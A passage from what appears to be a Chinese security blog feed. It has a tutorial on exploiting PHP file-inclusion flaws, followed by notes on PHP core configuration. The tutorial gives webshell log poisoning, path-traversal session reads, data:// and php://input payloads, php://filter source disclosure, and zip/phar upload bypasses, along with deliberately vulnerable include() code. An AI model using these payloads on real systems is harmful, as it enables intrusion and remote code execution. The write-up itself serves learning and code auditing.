<p>nc 1.1.1.1 80<br>&lt;?php php木马 ?&gt;<br>（木马写入对方日志文件）</p>
</blockquote>
<p>或<br>直接访问页面写入日志文件<br><code>http://www.xxx.com/php木马(urlencode)</code>(会被编码，用bursuite绕过编码)<br>也可以木马写入user-agent来写入日志文件</p>
<p>3.包含对方日志文件<br>4.url参数 &amp;cmd=命令  执行命令</p>
<h3 id="利用php-filter"><a href="#利用php-filter" class="headerlink" title="利用php://filter"></a>利用php://filter</h3><p>利用<strong>php://filter</strong>可以读取本地文件源码<br>由于关系到PHP伪协议放在下面详细说明举例</p>
<h3 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h3><p>session文件格式为<code>sess_[phpsessid]</code>,phpsessid作为cookie传递，在服务端文件位置会变化</p>
<pre><code>默认位置
/tmp/(PHP Sessions)
也可能
/var/lib/php/session/(PHP Sessions)
/var/lib/php5/(PHP Sessions)
c:/windows/temp/(PHP Sessions)等文件中。
</code></pre><p>尝试读取session文件<br><code>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</code><br>在某些特定的情况下如果你能够控制session的值，也许能够获得一个shell。</p>
<h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>如果你知道上传文件在服务器放置的位置，就可以上传木马文件，然后包含木马文件，这就是<code>文件上传漏洞</code>+<code>文件包含漏洞</code>的COMBO<br>关于可以知道上传文件在服务器的位置的，但是上传文件后缀名等等被过滤了。可以利用上传文件有关<strong>PHP伪协议</strong>的<code>绕过</code>，将在之后讨论</p>
<p>还有一种包含<strong>上传文件的tmp临时文件</strong>，因为往往上传文件会被重点防护，而临时文件不会被关注到。这种攻击方式不容易被防护，其中关键是知道临时文件路径及名称，关于这种攻击由于此文篇幅太长，另起一片叙述<code>基于phpinfo的包含临时文件</code></p>
<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含 RFI"></a>远程文件包含 RFI</h2><p>远程文件包含(RFI)紧密相关的两个php配置：<br><strong>allow_url_fopen</strong>:远程文件打开<br><strong>allow_url_include</strong>:远程文件包含<br>配置细节请查阅<a href="https://lalajun.github.io/2018/03/06/WEB-PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/#allow-url-include-%E6%98%AF%E5%90%A6%E5%85%81%E8%AE%B8%E5%8C%85%E5%90%AB%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6" target="_blank" rel="external">php核心配置</a></p>
<p>那么开始说明应用</p>
<blockquote>
<p>开始前，补充。<br>php中<strong>fopen函数</strong>与<strong>include函数</strong>区别：<br>fopen与include打开/包含远程文件时，对方服务器都会先解析文件然后被本地php代码 打开/包含。<br>区别是：<br>fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。include会包含进入代码内，再解析执行一次。<br>所以include包含的文件里有木马时，可以执行。fopen打开一个包含木马的文件，不会有什么大危害，因为只是作为文本文件。</p>
<p>再补充<strong>本地文件包含</strong>与<strong>远程文件包含</strong>的区别:<br>include ./shell.php;<br>include <a href="http://localhost/shell.php" target="_blank" rel="external">http://localhost/shell.php</a><br>以上两者有区别，前者为<strong>本地文件包含</strong>：如果shell.php文件中存在<code>&lt;?php 木马 ?&gt;</code>，木马会执行。但如果shell.php 中的木马是在php代码执行一遍过后，才产生的，是不会执行的。<br>即需要解析一遍shell.php页面，才产生木马。比如从数据库中读取了带木马的信息，嵌入到页面上。<br>而后者<strong>远程文件包含</strong>是前后者情况都会执行的：前者情况，会在远程访问shell.php的请求中执行。后者情况，会在远程访问结束后，把包含木马的返回内容include，再次执行。<br>即，本地文件包含本地文件 总共会解析一次，远程文件包含本地文件 总共会解析两次。</p>
</blockquote>
<p>以下测试是在php5.2中完成。</p>
<h3 id="当allow-url-fopen和allow-url-include都为On时"><a href="#当allow-url-fopen和allow-url-include都为On时" class="headerlink" title="当allow_url_fopen和allow_url_include都为On时"></a>当<em>allow_url_fopen</em>和<em>allow_url_include</em>都为On时</h3><p>可以进行远程文件包含执行，即可以包含在自己服务器的木马，形成web-shell。<br>也可以使用wget之类的命令来下载木马，保存，再访问木马文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"><span class="keyword">include</span>($url);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb8z6itpmj30r705bt8z.jpg" alt="3.png"><br></div>

<h4 id="data-输入方式"><a href="#data-输入方式" class="headerlink" title="data:输入方式"></a>data:输入方式</h4><p>另外还有一种方法是<a href="http://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="external">data：</a><br>本以为<strong>data：</strong>可以在<em>allow_url_fopen</em>为Off时可以起作用，测试时发现不可以。应该是<strong>data：</strong>被当做allow_url_fopen禁止的一项了。</p>
<blockquote>
<p>file=data:text/plain,&lt;?php phpinfo()?&gt;<br>file=data:text/plain,&lt;?php print_r(scandir(“.”));?&gt;<br>file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p>
</blockquote>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb90by9w2j30io08bweu.jpg" alt="8.png"><br></div>

<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb9062e6hj30if0a6wet.jpg" alt="7.png"><br></div>

<h3 id="当allow-url-fopen为On-allow-url-include不为Off时"><a href="#当allow-url-fopen为On-allow-url-include不为Off时" class="headerlink" title="当allow_url_fopen为On,allow_url_include不为Off时"></a>当<em>allow_url_fopen</em>为On,<em>allow_url_include</em>不为Off时</h3><p>只能进行远程文件打开，比如fopen(url)。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"></div><div class="line">$file=fopen($url,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line"><span class="keyword">while</span> (!feof($file))&#123;</div><div class="line">    $line = fgets($file,<span class="number">1024</span>);   </div><div class="line">    <span class="keyword">echo</span> $line;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb8zi936vj30lw04gwej.jpg" alt="4.png"><br></div>

<h3 id="当allow-url-fopen为Off，allow-url-include为On时"><a href="#当allow-url-fopen为Off，allow-url-include为On时" class="headerlink" title="当allow_url_fopen为Off，allow_url_include为On时"></a>当<em>allow_url_fopen</em>为Off，<em>allow_url_include</em>为On时</h3><p>当allow_url_include为On，而allow_url_fopen为Off的时候，不可以直接远程包含文件<br>但是可以使用    php://input、 php://stdin、 php://memory 和 php://temp等伪协议</p>
<p>由于php伪协议利用方式多样，我们新开一个篇章说明。但是要知道一些php伪协议的利用前提是allow_url_include为On，具体以官方文档为主</p>
<h2 id="php伪协议-PHP："><a href="#php伪协议-PHP：" class="headerlink" title="php伪协议 PHP：//"></a>php伪协议 PHP：//</h2><p>先查看<a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="external">PHP官方说明</a>,了解php伪协议</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><strong>php://input</strong>代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。<br>需要allow_url_include=On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"><span class="keyword">include</span>($url);<span class="comment">#加入此处变为$url.'php' 就无法利用，%00截断测试也无效</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb8zq81swj30iv0amwf2.jpg" alt="5.png"><br></div>

<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpb8zzo64xj30k80a8t92.jpg" alt="6.png"><br></div>

<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。<br><strong>不需要</strong>allow_url_include=On<br>格式：<br><code>php://filter/read=过滤器/resource=来源</code><br>关于php://filter有很多<a href="http://php.net/manual/zh/filters.php" target="_blank" rel="external">过滤器</a>可以使用<br>但是最经典的用法如下：</p>
<p><code>php://filter/convert.base64-encode/resource=index.php</code>read被省略</p>
<p>网页源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action=$_GET[<span class="string">'action'</span>];</div><div class="line"><span class="keyword">include</span> <span class="string">"$action.php"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>利用php://filter读取同目录下phpinfo.php</p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpycl9b3fxj30sq078mxm.jpg" alt="9.png"><br></div>

<h2 id="php伪协议phar-zip"><a href="#php伪协议phar-zip" class="headerlink" title="php伪协议phar:// zip://"></a>php伪协议phar:// zip://</h2><p>因为这两者性质差不多，就放一起了<br><a href="http://php.net/manual/zh/wrappers.phar.php" target="_blank" rel="external">phar://</a> :PHP 归档，不受allow_url_include影响，PHP 5.3.0 起有效<br><a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="external">zip://</a> :压缩流，不受allow_url_include影响<br>利用在文件包含漏洞+上传文件漏洞</p>
<p>当上传的文件不能以php结尾，被php解析的时候，可以把文件压缩成<strong>压缩包</strong>，改为.jpg结尾再上传<br>再通过<code>phar://</code> <code>zip://</code>解压缩打开，使用方法如下</p>
<h3 id="zip-使用"><a href="#zip-使用" class="headerlink" title="zip://使用"></a>zip://使用</h3><p>把木马文件1.php用zip压缩成1.zip，再修改后缀名为.jpg，绕过上传验证，再进行包含<br><code>/zip_phar.php?file=zip://D:/php/WWW/php_text/upfile/1.jpg%231.php</code><br>协议原型：zip://archive.zip#dir/file.txt <code>压缩包全路径#目录/文件</code><br>在测试中只有绝对路径可行，相对路径不行<br>另外在URL中需要把#编码，因为#与url协议冲突</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpyclm1yvsj30z506tt99.jpg" alt="11.jpg"><br></div>

<p>测试木马为<strong>&lt;?php echo ‘success’ ;?&gt;</strong></p>
<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpyclrcz9hj30m20523yn.jpg" alt="12.jpg"><br></div>

<h3 id="phar-使用"><a href="#phar-使用" class="headerlink" title="phar://使用"></a>phar://使用</h3><p>先把木马按照phar归档文件生成<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 把木马写入phartest.aaa的testfile.text</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/phartest.aaa'</span>, <span class="number">0</span>,<span class="string">'phartest'</span>,Phar::ZIP) ; </div><div class="line">$p-&gt;addFromString(<span class="string">'testfile.txt'</span>, <span class="string">'&lt;?php phpinfo();?&gt;'</span>); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>测试相对路径和绝对路径都可以<br><code>/zip_phar.php?file=phar://./upfile/phartest.aaa/testfile.txt</code><br><code>/zip_phar.php?file=phar://D:/php/WWW/php_text/upfile/phartest.aaa/testfile.txt</code><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpyclykdbsj30sd0bhjsh.jpg" alt="13.png"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpycm4hbdhj30sj0bmdgv.jpg" alt="14.png"></p>
<h2 id="解决文件包含问题"><a href="#解决文件包含问题" class="headerlink" title="解决文件包含问题"></a>解决文件包含问题</h2><ul>
<li>白名单，限制传入参数</li>
<li>过滤传入参数</li>
<li>配置opendir，限制打开范围</li>
<li>配置好allow_url_fopen,allow_url_include</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-PHP核心配置]]></title>
      <url>/2018/03/06/WEB-PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>—PHP5核心配置及测试—<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习《代码审计》这本书，按照书上大致理一遍重要的PHP配置，并做了测试。<br>还提及了allow_url_include及allow_url_fopen的相应延伸知识。</p>
<h2 id="wamp-lamp"><a href="#wamp-lamp" class="headerlink" title="wamp/lamp"></a>wamp/lamp</h2><p>解释两个名词：</p>
<ul>
<li><strong>wamp</strong>：Windows下的Apache(web服务器软件)+Mysql/MariaDB(数据库系统)+Perl/PHP/Python(编程语言)</li>
<li><strong>lamp</strong>：Linux下的Apache(web服务器软件)+Mysql/MariaDB(数据库系统)+Perl/PHP/Python(编程语言)</li>
</ul>
<p>另外还有以Nginx代替Apache作为web服务器软件，即形成<strong>wnmp/lnmp</strong></p>
<h2 id="PHP指令设定的范围"><a href="#PHP指令设定的范围" class="headerlink" title="PHP指令设定的范围"></a>PHP指令设定的范围</h2><table>
<thead>
<tr>
<th style="text-align:center">模式</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">PHP_INI_USER</td>
<td style="text-align:center">可在用户脚本（例如 ini_set()）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定 </td>
</tr>
<tr>
<td style="text-align:center">PHP_INI_PERDIR</td>
<td style="text-align:center">可在 php.ini(php中)，.htaccess(网站目录) 或 httpd.conf(Apache) 中设定</td>
</tr>
<tr>
<td style="text-align:center">PHP_INI_SYSTEM</td>
<td style="text-align:center">可在 php.ini 或 httpd.conf 中设定</td>
</tr>
<tr>
<td style="text-align:center">PHP_INI_ALL</td>
<td style="text-align:center">可在任何地方设定(包括ini_set())</td>
</tr>
</tbody>
</table>
<h2 id="PHP-指令配置修改"><a href="#PHP-指令配置修改" class="headerlink" title="PHP 指令配置修改"></a>PHP 指令配置修改</h2><p><strong>php.ini</strong>修改 打开文件修改。<br><strong>Windows注册表和httpd.conf修改</strong> 戳<a href="http://php.net/manual/zh/configuration.changes.php" target="_blank" rel="external">官方说明</a><br>具体说 .htaccess 和 ini_set</p>
<h3 id="htaccess修改"><a href="#htaccess修改" class="headerlink" title=".htaccess修改"></a>.htaccess修改</h3><p><strong>.htaccess</strong>是apache在网站目录下的的配置文件，作用域有限，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表等功能。<br>其他具体功能不细说，有兴趣点这里<a href="https://www.cnblogs.com/flyxiangshang/p/5336318.html" target="_blank" rel="external">=w=</a>和<a href="http://www.jb51.net/article/80656.htm" target="_blank" rel="external">QAQ</a><br>此处说明如何在.htaccess中修改php配置</p>
<ul>
<li>配置httpd.conf中的<em>AllowOverride</em>，使.htaccess能用</li>
<li>创建.htaccess文件(windows需要在命令行下创建)</li>
<li>写入配置内容</li>
</ul>
<p><strong>配置内容格式</strong>：<code>php_value 配置名称 值</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php_value register_globals On</div></pre></td></tr></table></figure></p>
<h3 id="ini-set-修改"><a href="#ini-set-修改" class="headerlink" title="ini_set()修改"></a>ini_set()修改</h3><p><strong>ini_set</strong> — 为一个配置选项设置值<br><code>string ini_set ( string $varname , string $newvalue )</code><br>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。<br>成功时返回旧的值，失败时返回 FALSE。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> ini_get(<span class="string">'display_errors'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">if</span>(ini_set(<span class="string">'display_errors'</span>,<span class="string">'1'</span>)!=<span class="keyword">FALSE</span>) <span class="keyword">echo</span> <span class="string">'success'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> ini_get(<span class="string">'display_errors'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb9n9b4h8j30cj04cjr9.jpg" alt="9.png"><br></div>

<h2 id="register-globals-全局变量注册开关"><a href="#register-globals-全局变量注册开关" class="headerlink" title="register_globals(全局变量注册开关)"></a>register_globals(全局变量注册开关)</h2><p>在 PHP &lt;= 4.2.3 时是 <strong>PHP_INI_ALL</strong>。之后版本是 <strong>PHP_INI_PERDIR</strong><br>在 php &lt; 5.3.0 时是 默认为On<br>在 php &gt;= 5.3.0 时是 默认为Off<br>在 php 5.4.0 版本移除该选项，即永久为Off<br><strong>作用</strong>：设置为On时，会直接把用户GET、POST等方式提交上来的参数注册成<strong>全局变量</strong>并初始化只为参数对应的值，使得提交参数可以直接在脚本中使用</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成(PHP_INI_PERDIR,默认为On)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'admin'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'user'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb8ypp9gtj30i002v0sm.jpg" alt="1.png"><br>当代码中已经<strong>初始化</strong>则无效：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user=<span class="string">'user'</span>;</div><div class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'admin'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'user'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb8z17jc2j30gp027746.jpg" alt="2.png"><br></div>

<h2 id="allow-url-include-是否允许包含远程文件"><a href="#allow-url-include-是否允许包含远程文件" class="headerlink" title="allow_url_include(是否允许包含远程文件)"></a>allow_url_include(是否允许包含远程文件)</h2><p>具体范围的版本 在书中与官网不全一致。以下为官网的说明<br>在 PHP 5 时是 <strong>PHP_INI_SYSTEM</strong>，默认为Off，从 PHP 5.2.0 起可用。<br>现在为 <strong>PHP_INI_ALL</strong>。</p>
<blockquote>
<p>但是测试时发现一个BUG：<br>allow_url_include 的可配置范围为PHP_INI_ALL,也就是可以用ini_set()来设置<br>但是事实确实设置不了,从PHP5.2到PHP7都不行。<br>所以结论是:allow_url_include 与 allow_url_fopen 一样都是 PHP_IN_SYSTEM</p>
</blockquote>
<p><strong>作用</strong>：设置为On时，可以直接包含远程文件(http:// 与ftp:// )，比如include包含。<code>include($var)</code> 当$var可控时，可以执行PHP代码<br>讲<strong>allow_url_include</strong>的同时就会提到<strong>allow_url_fopen</strong>。因为在官方文档中使用<em>allow_url_include</em>的前提是<em>allow_url_fopen</em>为On</p>
<h3 id="allow-url-fopen-是否允许打开远程文件"><a href="#allow-url-fopen-是否允许打开远程文件" class="headerlink" title="allow_url_fopen(是否允许打开远程文件)"></a>allow_url_fopen(是否允许打开远程文件)</h3><p>在 PHP &lt;= 4.3.4 时是 PHP_INI_ALL。之后版本是 PHP_INI_SYSTEM,默认为On<br><strong>作用</strong>：设置为On时，允许打开远程文件，比如fopen打开。</p>
<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>其实这两个选项形成的就是<strong>远程文件包含漏洞RFI</strong><br>查看另一篇博客吧<a href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/" target="_blank" rel="external">戳这里</a> </p>
<h2 id="magic-quotes-gpc-魔术引号自动过滤"><a href="#magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="magic_quotes_gpc(魔术引号自动过滤)"></a>magic_quotes_gpc(魔术引号自动过滤)</h2><p>在 PHP &lt;= 4.2.3 时是 <strong>PHP_INI_ALL</strong>，之后是 <strong>PHP_INI_PERDIR</strong>， 默认为On。<br>从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项。（避免了magic_quotes_gpc未设置，用户依赖这个设置而带来了安全隐患）<br><strong>作用</strong>：为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。当 magic_quotes 为 on，自动在单引号(‘)、双引号(“)、反斜杠()及空字符(NULL)前面加上反斜杠()。不会过滤<strong>$_SERVER</strong>变量，可以利用client-ip、referer一类的漏洞。<br>如果 magic_quotes_sybase 也是 ON，它会完全覆盖 magic_quotes_gpc</p>
<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成。<br>magic_quotes_gpc 为 On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">print_r($_GET);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb90lzewyj30go040glk.jpg" alt="10.png"><br></div>

<h2 id="magic-quotes-runtime-魔术引号自动过滤"><a href="#magic-quotes-runtime-魔术引号自动过滤" class="headerlink" title="magic_quotes_runtime(魔术引号自动过滤)"></a>magic_quotes_runtime(魔术引号自动过滤)</h2><p>范围是 <strong>PHP_INI_ALL</strong>，默认为 Off<br>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br><strong>作用</strong>：对于从<strong>数据库或者文件</strong>中获取的数据自动在单引号(‘)、双引号(“)、反斜杠()及空字符(NULL)前面加上反斜杠() （测试后貌似对空字符无效）<br>如果 magic_quotes_sybase 也是 ON，它会完全覆盖 magic_quotes_runtime<br>覆盖函数列表:</p>
<pre><code>get_meta_tags()
file_get_contents()
file()
fgets()
fwrite()
fread()
fputcsv()
stream_socket_recvfrom()
exec()
system()
passthru()
stream_get_contents()
bzread()
gzfile()
gzgets()
gzwrite()
gzread()
exif_read_data()
dba_insert()
dba_replace()
dba_fetch()
ibase_fetch_row()
ibase_fetch_assoc()
ibase_fetch_object()
mssql_fetch_row()
mssql_fetch_object()
mssql_fetch_array()
mssql_fetch_assoc()
mysqli_fetch_row()
mysqli_fetch_array()
mysqli_fetch_assoc()
mysqli_fetch_object()
pg_fetch_row()
pg_fetch_assoc()
pg_fetch_array()
pg_fetch_object()
pg_fetch_all()
pg_select()
sybase_fetch_object()
sybase_fetch_array()
sybase_fetch_assoc()
SplFileObject::fgets()
SplFileObject::fgetcsv()
SplFileObject::fwrite()
</code></pre><h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成。<br>magic_quotes_runtime 为 On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//1.txt '"\</span></div><div class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"1.txt"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb90u3ty4j30em02jq2t.jpg" alt="11.png"><br></div>

<h2 id="magic-quptes-sybase（魔术引号自动过滤）"><a href="#magic-quptes-sybase（魔术引号自动过滤）" class="headerlink" title="magic_quptes_sybase（魔术引号自动过滤）"></a>magic_quptes_sybase（魔术引号自动过滤）</h2><p>范围是 <strong>PHP_INI_ALL</strong> 。默认为Off<br>在 PHP 5.4.0 中移除该选项。<br><strong>作用</strong>：当设置为On时，会覆盖掉magic_quotes_gpc=On。仅仅 转义空字符 以及 单引号(‘)前再加一个单引号(‘)。会覆盖掉magic_quotes_runtime=On,仅仅把单引号(‘)前再加一个单引号(‘)</p>
<h3 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成。<br>magic_quotes_gpc 为 On<br>magic_quotes_runtime 为 On<br>magic_quotes_sybase 为 On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//1.txt 1'2"3\</span></div><div class="line">print_r($_GET);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"1.txt"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb91002yij30hh03n0sp.jpg" alt="12.png"><br></div>

<h2 id="safe-mode-安全模式"><a href="#safe-mode-安全模式" class="headerlink" title="safe_mode(安全模式)"></a>safe_mode(安全模式)</h2><p>范围是 <strong>PHP_INI_SYSTEM</strong> ，默认为 Off。<br>在 PHP 5.4.0 中移除该选项。<br><a href="http://php.net/manual/zh/ini.sect.safe-mode.php#ini.safe-mode-gid" target="_blank" rel="external">官方文档</a><br><strong>作用</strong>：<br>1.PHP 所有文件操作函数 会受到限制。会检查当前脚本的拥有者是否和将被操作的文件的拥有者相匹配，即你不能操作不属于你的文件。如果需要用 include等函数 加载一些放在非WEB服务启动用户所有的目录下的脚本文件，使用<strong>safe_mode_include_dir</strong>指令来配置可以包含的路径。<br>2.PHP 函数执行命令或程序会提示错误。当使用外部脚本时，集中在一个目录下，使用<strong>safe_mode_exec_dir</strong>指令指向目录。<br>当safe_mode为On时，下面选项开启<br>下列选项范围都为<strong>PHP_INI_SYSTEM</strong></p>
<ul>
